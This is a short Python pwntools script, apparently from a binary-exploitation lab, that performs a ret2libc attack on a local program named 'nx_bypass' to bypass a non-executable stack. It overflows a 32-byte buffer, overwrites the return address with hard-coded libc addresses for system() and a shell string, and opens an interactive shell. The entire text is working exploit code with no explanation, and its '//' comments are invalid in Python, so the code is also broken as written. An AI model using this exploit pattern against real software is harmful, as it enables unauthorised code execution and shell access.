from pwn import *

io = process('nx_bypass')


buffer = b"A" * 32
system_libc = p32(0xf7c4f140) //change the address to your libc system 
fake_ret = b"AAAA"
shlibc_string = p32(0xf7dc3df4) //here too


payload = buffer + system_libc + fake_ret + shlibc_string

io.sendline(payload)
io.interactive()
